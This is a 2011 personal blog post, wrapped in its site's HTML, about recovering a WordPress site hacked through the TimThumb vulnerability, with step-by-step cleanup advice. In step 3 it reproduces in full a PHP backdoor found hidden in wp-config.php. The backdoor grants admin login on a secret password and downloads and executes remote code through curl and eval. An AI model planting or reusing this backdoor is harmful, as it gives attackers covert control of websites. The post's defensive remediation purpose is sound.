<!DOCTYPE html>
 <html lang="en"><head><meta charset="utf-8"/><meta http-equiv="X-UA-Compatible" content="IE=edge"/><meta name="viewport" content="width=device-width,initial-scale=1.0"/><title data-react-helmet="true">Warning - Something&#x27;s Not Right Here • Blake Embrey</title><meta data-react-helmet="true" name="description" content="A personally curated collection of words hosted in cyberspace for an indeterminate duration."/><style data-react-free-style="true">::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}[type="checkbox"],[type="radio"]{box-sizing:border-box;padding:0}[type="number"]::-webkit-inner-spin-button,[type="number"]::-webkit-outer-spin-button{height:auto}[type="search"]{-webkit-appearance:textfield;outline-offset:-2px}[type="search"]::-webkit-search-cancel-button,[type="search"]::-webkit-search-decoration{-webkit-appearance:none}a{-webkit-text-decoration-skip:objects;background-color:transparent}abbr[title]{border-bottom:none;text-decoration:underline;text-decoration:underline dotted}audio:not([controls]){display:none;height:0}b,strong{font-weight:inherit;font-weight:bolder}button,html [type="button"], [type="reset"],[type="submit"]{-webkit-appearance:button}button,input{overflow:visible}button,input,optgroup,select,textarea{margin:0}button,select{text-transform:none}button:-moz-focusring,[type="button"]:-moz-focusring,[type="reset"]:-moz-focusring,[type="submit"]:-moz-focusring{outline:1px dotted ButtonText}button::-moz-focus-inner,[type="button"]::-moz-focus-inner,[type="reset"]::-moz-focus-inner,[type="submit"]::-moz-focus-inner{border-style:none;padding:0}audio,video,canvas{display:inline-block}dfn{font-style:italic}article,aside,footer,header,nav,section,details,menu,figcaption,figure,main{display:block}figure{margin:1em 40px}h1{font-size:2em;margin:0.67em 0}hr{box-sizing:content-box;height:0;overflow:visible}html{-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%;line-height:1.15}img{border-style:none}legend{box-sizing:border-box;color:inherit;display:table;max-width:100%;padding:0;white-space:normal}mark{background-color:#ff0;color:#000}code,kbd,samp,pre{font-family:monospace, monospace;font-size:1em}progress{display:inline-block;vertical-align:baseline}small{font-size:80%}sub{bottom:-0.25em}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}summary{display:list-item}sup{top:-0.5em}svg:not(:root){overflow:hidden}[hidden],template{display:none}textarea{overflow:auto}*{box-sizing:border-box}.hljs-addition{background:#dfd}.hljs-attribute,.hljs-variable,.hljs-body{color:#008080}.hljs-change{background:#0086b3}.hljs-class .hljs-title,.hljs-type,.hljs-literal,.hljs-command{color:#458;font-weight:500}.hljs-deletion{background:#fdd}.hljs-header,.hljs-comment,.hljs-javadoc{color:#969896}.hljs-keyword,.hljs-winutils,.hljs-subst,.hljs-request,.hljs-status{color:#a71d5d}.hljs-built_in,.hljs-number,.hljs-hexcolor,.hljs-constant{color:#0086b3}.hljs-preprocessor,.hljs-pragma,.hljs-pi,.hljs-doctype,.hljs-shebang,.hljs-cdata{color:#999;font-weight:500}.hljs-regexp{color:#009926}.hljs-string,.hljs-tag .hljs-value,.hljs-phpdoc,.hljs-dartdoc,.hljs-formula{color:#df5000}.hljs-symbol,.hljs-symbol .hljs-string,.hljs-special,.hljs-prompt{color:#990073}.hljs-tag,.hljs-tag .hljs-title,.hljs-rules .hljs-property{color:#000080}.hljs-title,.hljs-id,.hljs-preprocessor{color:#795da3}a{border-bottom:2px solid #dcdcdc;color:#111;text-decoration:none}a:hover{border-bottom-color:#f20}body{color:#111;font-family:sans-serif;font-size:17px;font-weight:300;line-height:1.7;margin:0}pre .diff-addition{background-color:#dfd}.hljs-chunk,pre .diff-chunk{color:#aaa}pre .diff-deletion{background-color:#fdd}.f1evzss3{border-top:4px solid #f20}.fsclf6o{margin:0 auto;max-width:640px;padding:20px}.f5tm013{margin:0;padding:30px 0}.f5tm013 > li{display:inline-block;list-style:none;margin-right:20px}.f5qoj4b{border-bottom-color:transparent;color:#333}.f13o7dmr h1, h2, h3, h4, h5, h6{font-weight:500}.f13o7dmr h1{font-size:1.7em}.f13o7dmr h2{font-size:1.3em}.f13o7dmr h3{font-size:1.1em}.f13o7dmr hr{border-bottom:1px dashed #fff;border-top:1px dashed #aaa;display:block;margin:1.5em 0}.f13o7dmr blockquote{border-left:4px solid #f20;margin:1em 0;padding-left:1em}.f13o7dmr img,audio,embed,video,object{height:auto;max-width:100%}.f13o7dmr code, pre{background-color:#f3f3f3;border:1px solid #ccc;color:#111;font-family:monospace;font-size:0.9em}.f13o7dmr pre{line-height:1.3;overflow-x:auto;padding:0.6em 0.8em}.f13o7dmr code{border-color:#ccc;display:inline;padding:0 0.3em;white-space:pre-line;word-wrap:break-word}.f13o7dmr pre > code{background-color:transparent;border:none;font-size:100%;padding:0;white-space:pre;word-wrap:normal}.f13o7dmr a:hover > code{border-color:#f20}.f1ymzfbz{color:#777;font-size:0.85em;margin:1.5em 0;padding:0}.f1ymzfbz > li > a{color:#777}.f1ymzfbz > li{display:inline-block;list-style:none;padding-right:20px}</style></head><body><div id="react-mount"><div data-reactroot="" data-reactid="1" data-react-checksum="-70894693"><!-- react-empty: 2 --><div class="f1evzss3" data-reactid="3"></div><div class="fsclf6o" data-reactid="4"><ul class="f5tm013" data-reactid="5"><li data-reactid="6"><a class="f5qoj4b" href="/" data-reactid="7">Blog</a></li><li data-reactid="8"><a class="f5qoj4b" href="http://blakeembrey.me" data-reactid="9">About</a></li><li data-reactid="10"><a class="f5qoj4b" href="/rss.xml" data-reactid="11">RSS</a></li></ul><div class="f13o7dmr" data-reactid="12"><div data-reactid="13"><!-- react-empty: 14 --><h1 data-reactid="15">Warning - Something&#x27;s Not Right Here</h1><ul class="f1ymzfbz" data-reactid="16"><li data-reactid="17"><!-- react-text: 18 -->Written<!-- /react-text --><!-- react-text: 19 --> <!-- /react-text --><time datetime="2011-09-30T19:00:00.000Z" data-reactid="20">September 2011</time></li></ul><div data-reactid="21"><p><img src="warning.png" alt="Chrome is broken :/"></p>
<p>About two days ago, I received a warning from Google saying my website has been exploited and hacked. Of course, the emails they sent I never received, so I didn’t realise I had an issue until about an hour ago. My first reaction was OMG, WTF! I knew it most likely had something to do with the recent TimThumb exploit, but I didn’t even know my theme had TimThumb included. I also looked at the Google diagnostic repost which it linked me to, which I found the malware related to <code>counter-wordpress.com</code>.</p>
<p>First of all, I would advise running the script found at <a href="http://blog.sucuri.net/2011/08/timthumb-php-security-vulnerability-just-the-tip-of-the-iceberg.html">Sucuri</a>. Then, scan your site using the <a href="http://sitecheck.sucuri.net/scanner/">Sucuri Site Scanner</a> to find out which pages they have exploited and how. This is the best little site I have found for this, and I would definitely bookmark it for future reference as well if I were you.</p>
<p>Extremely quickly, I jumped to action. This is the exact steps I took and you can take too, to remove the exploits from your code:</p>
<ol>
<li>Delete the following files:</li>
</ol>
<pre><code>wp-admin/upd.php
wp-content/upd.php
</code></pre>
<ol start="2">
<li>Log into WordPress admin and reinstall your WordPress version. We are focusing on these three files:</li>
</ol>
<pre><code>wp-settings.php
wp-includes/js/jquery/jquery.js
wp-includes/js/l10n.js
</code></pre>
<ol start="3">
<li>Open “<code>wp-config.php</code>” and look for anything that seems out of place. In mine, I found a script which appears to harvest login credentials/cookies, which found on the 2000 or so line. Above and a few thousand lines below were all blank:</li>
</ol>
<pre><code class="language-php"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'pingnow'</span>])&amp;&amp; <span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'pass'</span>])){
<span class="hljs-keyword">if</span> ($_GET[<span class="hljs-string">'pass'</span>] == <span class="hljs-string">'19ca14e7ea6328a42e0eb13d585e4c22'</span>){
<span class="hljs-keyword">if</span> ($_GET[<span class="hljs-string">'pingnow'</span>]== <span class="hljs-string">'login'</span>){
$user_login = <span class="hljs-string">'admin'</span>;
$user = get_userdatabylogin($user_login);
$user_id = $user-&gt;ID;
wp_set_current_user($user_id, $user_login);
wp_set_auth_cookie($user_id);
do_action(<span class="hljs-string">'wp_login'</span>, $user_login);
}
<span class="hljs-keyword">if</span> (($_GET[<span class="hljs-string">'pingnow'</span>]== <span class="hljs-string">'exec'</span>)&amp;&amp;(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'file'</span>]))){
$ch = curl_init($_GET[<span class="hljs-string">'file'</span>]);
$fnm = md5(rand(<span class="hljs-number">0</span>,<span class="hljs-number">100</span>)).<span class="hljs-string">'.php'</span>;
$fp = fopen($fnm, <span class="hljs-string">"w"</span>);
curl_setopt($ch, CURLOPT_FILE, $fp);
curl_setopt($ch, CURLOPT_HEADER, <span class="hljs-number">0</span>);
curl_setopt($ch, CURLOPT_TIMEOUT, <span class="hljs-number">5</span>);
curl_exec($ch);
curl_close($ch);
fclose($fp);
<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;SCRIPT LANGUAGE="</span>JavaScript<span class="hljs-string">"&gt;location.href='$fnm';&lt;/SCRIPT&gt;"</span>;
}
<span class="hljs-keyword">if</span> (($_GET[<span class="hljs-string">'pingnow'</span>]== <span class="hljs-string">'eval'</span>)&amp;&amp;(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'file'</span>]))){
$ch = curl_init($_GET[<span class="hljs-string">'file'</span>]);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="hljs-keyword">true</span>);
curl_setopt($ch, CURLOPT_HEADER, <span class="hljs-number">0</span>);
curl_setopt($ch, CURLOPT_TIMEOUT, <span class="hljs-number">5</span>);
$re = curl_exec($ch);
curl_close($ch);
<span class="hljs-keyword">eval</span>($re);
}}}
</code></pre>
<ol start="4">
<li>In your theme, look for anywhere the TimThumb script may be storing the cached files. These are generally along the lines of:</li>
</ol>
<pre><code>wp-content/themes/theme-name/scripts/cache/external_{MD5Hash}.php
wp-content/themes/theme-name/temp/cache/external_{MD5Hash}.php
</code></pre>
<p>If you found anything like the above, delete it straight away. If you’re not sure, delete every file that isn’t an image.</p>
<ol start="5">
<li>
<p>Replace <code>timthumb.php</code> with the latest version found at <code>http://timthumb.googlecode.com/svn/trunk/timthumb.php</code>.</p>
</li>
<li>
<p>Change your MySQL and login password and update wp-config.php to correspond with the update.</p>
</li>
<li>
<p>Change the secret keys in <code>wp-config.php</code>.</p>
</li>
<li>
<p>Clear your browsers cache and cookies.</p>
</li>
<li>
<p>Empty any page caching plugins you may have enabled to push the updates through to your visitors.</p>
</li>
</ol>
<p>Throughout this, I also found a botting script and some spam black hat links. Make sure you scan your site using the <a href="http://sitecheck.sucuri.net/scanner/">Sucuri Site Scanner</a> once again to make sure you removed all the exploits. When you are sure you have removed everything, submit your site to Google for review. This can be done in the <code>Diagnostics -&gt; Malware</code> tab of your Google Webmaster account. To keep up with anymore potential exploits, I would recommend following their fantastic blog found at <a href="http://blog.sucuri.net/">blog.sucuri.net</a>.</p>
</div><hr data-reactid="22"/><p data-reactid="23"><strong data-reactid="24">Questions?</strong><!-- react-text: 25 --> <!-- /react-text --><!-- react-text: 26 -->Ask me on<!-- /react-text --><!-- react-text: 27 --> <!-- /react-text --><a href="https://twitter.com/blakeembrey" data-reactid="28">Twitter</a><!-- react-text: 29 --> <!-- /react-text --><!-- react-text: 30 -->or in<!-- /react-text --><!-- react-text: 31 --> <!-- /react-text --><a href="https://github.com/blakeembrey/knowledge" data-reactid="32">my repo</a><!-- react-text: 33 -->.<!-- /react-text --></p></div></div></div></div></div><script src="/bundle.js?t=1491774347138"></script></body></html>